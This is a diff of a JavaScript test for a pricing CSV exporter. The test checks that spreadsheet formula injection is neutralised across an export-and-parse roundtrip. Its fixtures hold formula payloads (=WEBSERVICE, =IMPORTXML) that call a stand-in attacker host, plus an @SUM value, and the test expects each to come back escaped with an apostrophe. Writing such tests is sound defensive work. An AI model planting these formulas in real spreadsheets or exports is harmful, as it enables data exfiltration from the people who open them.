@@ -375,9 +375,10 @@ describe('exportPricingCSV — roundtrip', () => {
       { cable: { '=WEBSERVICE("https://attacker.example")': 1.2 } },
       { source: '=IMPORTXML("https://attacker.example","//a")', date: '@SUM(1+1)' }
     );
-    assert.ok(csv.includes('\'=WEBSERVICE("https://attacker.example")'));
-    assert.ok(csv.includes('\'=IMPORTXML("https://attacker.example","//a")'));
-    assert.ok(csv.includes('\'@SUM(1+1)'));
+    const { prices, meta } = parsePricingCSV(csv);
+    assert.strictEqual(Object.keys(prices.cable)[0], '\'=WEBSERVICE("https://attacker.example")');
+    assert.strictEqual(meta.source, '\'=IMPORTXML("https://attacker.example","//a")');
+    assert.strictEqual(meta.date, '\'@SUM(1+1)');
   });
 
   it('quotes CSV fields that contain commas', () => {
